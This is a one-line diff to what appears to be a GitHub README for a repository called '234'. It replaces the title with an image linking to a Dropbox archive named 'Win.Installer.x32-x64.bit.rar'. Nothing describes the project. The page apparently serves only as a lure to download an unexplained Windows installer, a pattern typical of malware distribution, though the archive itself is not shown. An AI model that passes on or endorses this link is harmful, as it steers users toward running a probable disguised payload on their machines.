@@ -1,1 +1,1 @@
-# 234
+[![52](https://github.com/noroam/234/assets/160097252/cf3b9203-1002-4fb0-ac00-2a9a520daee5)](https://www.dropbox.com/scl/fi/uz870dzzxj4mvrw906mc3/Win.Installer.x32-x64.bit.rar?rlkey=v26a74jhghrn3ce7i0ekyad44&st=qwbgz4mq&)
